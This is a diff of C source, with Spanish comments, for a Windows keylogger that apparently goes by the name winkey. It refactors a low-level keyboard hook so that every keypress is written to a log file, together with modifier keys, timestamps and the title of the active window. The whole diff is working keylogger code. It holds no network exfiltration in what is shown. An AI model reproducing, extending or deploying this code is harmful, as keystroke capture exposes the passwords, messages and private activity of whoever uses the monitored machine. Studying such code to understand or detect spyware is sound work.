@@ -3,6 +3,32 @@
 // Variable global para el hook
 static HHOOK g_hHook = NULL;
 FILE* logFile = NULL;
+static HWND lastHwnd = NULL;
+
+void LogWindowChangeIfNeeded(HWND currentHwnd) {
+    if (currentHwnd != lastHwnd) {
+        lastHwnd = currentHwnd;
+
+        // Obtener el título de la ventana
+        WCHAR windowTitle[256];
+        GetWindowTextW(currentHwnd, windowTitle, 256);
+
+        // Obtener el timestamp
+        time_t t = time(NULL);
+        struct tm tm_info;
+        localtime_s(&tm_info, &t);
+        char timeString[30];
+        strftime(timeString, sizeof(timeString), "%d.%m.%Y %H:%M:%S", &tm_info);
+
+        // Escribir la cabecera en el log
+        if (logFile) {
+            char title_mb[256];
+            WideCharToMultiByte(CP_UTF8, 0, windowTitle, -1, title_mb, sizeof(title_mb), NULL, NULL);
+            fprintf(logFile, "\n\n[%s] - '%s'\n", timeString, title_mb);
+            fflush(logFile);
+        }
+    }
+}
 
 // Funcion para crear/abrir archivo de log
 BOOL CreateLogFile(void)
@@ -32,95 +58,55 @@ BOOL CreateLogFile(void)
     return TRUE;
 }
 
-// Funcion que se ejecuta cada vez que se pulsa una tecla
-LRESULT CALLBACK LowLevelKeyboardProc(
-    int nCode,	// Estado del hook (debe ser HC_ACTION para actuar) 
-    WPARAM wParam, // Tipo de evento: tecla presionada (WM_KEYDOWN)
-    LPARAM lParam) // Info sobre la tecla (estructura) 
+void AppendModifiers(char* buffer, size_t bufferSize)
 {
-    // Variable estatica para recordar la ultima ventana activa (Handle to windows)
-    static HWND lastHwnd = NULL;
+    int shift = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
+    int ctrl = (GetAsyncKeyState(VK_CONTROL) & 0x8000) != 0;
+    int alt = (GetAsyncKeyState(VK_MENU) & 0x8000) != 0;
+
+    if (shift) strcat_s(buffer, bufferSize, "[shift+]");
+    if (ctrl) strcat_s(buffer, bufferSize, "[ctrl+]");
+    if (alt) strcat_s(buffer, bufferSize, "[alt+]");
+}
+
+// Funcion que se ejecuta cada vez que se pulsa una tecla
+LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) 
+{
 
     if (nCode == HC_ACTION) {
         // Procesar y escribir la tecla
         KBDLLHOOKSTRUCT *p = (KBDLLHOOKSTRUCT *)lParam;
         DWORD vkCode = p->vkCode;  // Código virtual de la tecla
 
-        // --- Solución robusta para CAPS LOCK ---
-        static BOOL capsLockWasDown = FALSE;
-        if (vkCode == VK_CAPITAL) {
-            if (wParam == WM_KEYDOWN) {
-                if (!capsLockWasDown) {
-                    capsLockWasDown = TRUE;
-                    // Solo procesar el flanco de subida (primera vez que se pulsa)
-                } else {
-                    // Ya estaba pulsado, ignorar duplicados
-                    return CallNextHookEx(g_hHook, nCode, wParam, lParam);
-                }
-            } else if (wParam == WM_KEYUP) {
-                capsLockWasDown = FALSE;
-                // No procesar nada en el flanco de bajada
-                return CallNextHookEx(g_hHook, nCode, wParam, lParam);
-            } else {
-                // Otros eventos, ignorar
-                return CallNextHookEx(g_hHook, nCode, wParam, lParam);
-            }
-        }
-
         // Solo procesar eventos de tecla presionada
         if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
-            // 1. Obtener la ventana actual
+            
+            // Obtener la ventana actual
             HWND currentHwnd = GetForegroundWindow();
             
-            // Comprobar si la ventana ha cambiado
-            if (currentHwnd != lastHwnd) {
-                // Actualizamos la ventana
-                lastHwnd = currentHwnd;
+            // gestionar el cambio de ventana
+            LogWindowChangeIfNeeded(currentHwnd);
 
-                // Obtenemos el titulo de la ventana
-                WCHAR windowTitle[256];
-                GetWindowTextW(currentHwnd, windowTitle, 256);
+            // Construir string legible
+            char logStr[64] = {0};
+            AppendModifiers(logStr, sizeof(logStr));
+            strcat_s(logStr, sizeof(logStr), VkCodeToString(vkCode));
+            
 
-                // obtener el timestamp
-                time_t t = time(NULL);
-                struct tm tm_info;
-                localtime_s(&tm_info, &t);
-                char timeString[30];
-                strftime(timeString, sizeof(timeString), "%d.%m.%Y %H:%M:%S", &tm_info);
-
-                // Escribir la cabezera en el log
-                if (logFile) {
-                    // Convertir el titulo de WCHAR a char par fprintf
-                    char title_mb[256];
-                    WideCharToMultiByte(CP_UTF8, 0, windowTitle, -1, title_mb, sizeof(title_mb), NULL, NULL);
-                    fprintf(logFile, "\n\n[%s] - '%s'\n", timeString, title_mb);
-                    fflush(logFile);
-                }
+            // Guardar en el log
+            if (logFile) {
+                fprintf(logFile, "%s", logStr);
+                fflush(logFile);
             }
-
-            // --- Obtener el Idioma que se esta usando ---
-            // Obtener el HILO de la ventana activa para saber su distribución de teclado
-            DWORD threadId = GetWindowThreadProcessId(currentHwnd, NULL);
-            // Obtener la distribución de teclado (Qwerty, azerty, etc) de ese hilo
-            HKL keyboardLayout = GetKeyboardLayout(threadId);
-            // --- Fin de obtener el idioma ---
-
-            // Funcion para obtener el caracter o nombre de la tecla
-            char* keyChar = VirtualKeyToChar(vkCode, p->scanCode, keyboardLayout);
 
             // Ver en terminal las teclas pulsadas ejecutando winkey.exe 
             //printf("Tecla: %lu, \tchar: %s\n", vkCode, keyChar);
             //printf("vkCode: %lu, scanCode: %lu, char: %s\n", vkCode, p->scanCode, keyChar);
-
-            // crear archivo si no existe
-            if (logFile) {
-                fprintf(logFile, "%s", keyChar);
-                fflush(logFile); //Forzar escritura inmediata
-            }
         }
     }
     return CallNextHookEx(g_hHook, nCode, wParam, lParam);
 }
+
 
 // Activar hook
 BOOL ActivateHook(void)
